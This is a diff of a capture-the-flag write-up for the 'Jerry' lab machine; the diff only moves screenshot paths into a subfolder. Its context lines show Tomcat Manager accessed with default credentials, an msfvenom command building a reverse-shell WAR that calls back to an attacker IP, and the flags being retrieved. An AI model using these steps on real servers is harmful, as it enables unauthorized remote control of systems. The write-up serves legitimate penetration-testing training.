@@ -40,7 +40,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.15.136
 ```
 
-![ping](jerry_01_ping.png)
+![ping](screenshots/jerry_01_ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -60,7 +60,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.15.136 -oG allPorts
 - `-Pn`: Skip host discovery  
 - `-oG`: Output in grepable format
 
-![allports](jerry_02_nmap_allports.png)
+![allports](screenshots/jerry_02_nmap_allports.png)
 
 Extract open ports:
 
@@ -68,7 +68,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractports](jerry_03_extractports.png)
+![extractports](screenshots/jerry_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -84,7 +84,7 @@ cat targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-![targeted](jerry_04_nmap_targeted.png)
+![targeted](screenshots/jerry_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -103,11 +103,11 @@ Identify web technologies:
 whatweb http://10.129.15.136:8080
 ```
 
-![whatweb](jerry_05_whatweb.png)
+![whatweb](screenshots/jerry_05_whatweb.png)
 
 Accessing the site shows the default Tomcat landing page with links to **Manager App** and **Host Manager**:
 
-![web](jerry_06_tomcat_landing.png)
+![web](screenshots/jerry_06_tomcat_landing.png)
 
 ---
 ## 3. Foothold
@@ -119,11 +119,11 @@ Clicking **Manager App** prompts for authentication. Providing invalid credentia
 - Username: `tomcat`
 - Password: `s3cret`
 
-![manager_403](jerry_07_manager_403.png)
+![manager_403](screenshots/jerry_07_manager_403.png)
 
 Using `tomcat:s3cret` successfully authenticates to the Tomcat Web Application Manager:
 
-![manager_authenticated](jerry_08_manager_authenticated.png)
+![manager_authenticated](screenshots/jerry_08_manager_authenticated.png)
 
 ---
 ### 3.2 WAR Upload â†’ Reverse Shell
@@ -134,11 +134,11 @@ Tomcat Manager supports deploying applications via WAR upload. I generated a JSP
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.206 LPORT=443 -f war -o shell.war
 ```
 
-![msfvenom_war](jerry_09_msfvenom_war.png)
+![msfvenom_war](screenshots/jerry_09_msfvenom_war.png)
 
 After uploading `shell.war`, a new application context `/shell` is deployed:
 
-![war_deployed](jerry_10_war_deployed.png)
+![war_deployed](screenshots/jerry_10_war_deployed.png)
 
 I started a listener and triggered the payload by visiting `http://10.129.15.136:8080/shell/`:
 
@@ -160,7 +160,7 @@ dir
 type \"2 for the price of 1.txt\"
 ```
 
-![system_shell_flags](jerry_11_system_shell_flags.png)
+![system_shell_flags](screenshots/jerry_11_system_shell_flags.png)
 
 ðŸ **User flag obtained**  
 ðŸ **Root flag obtained**
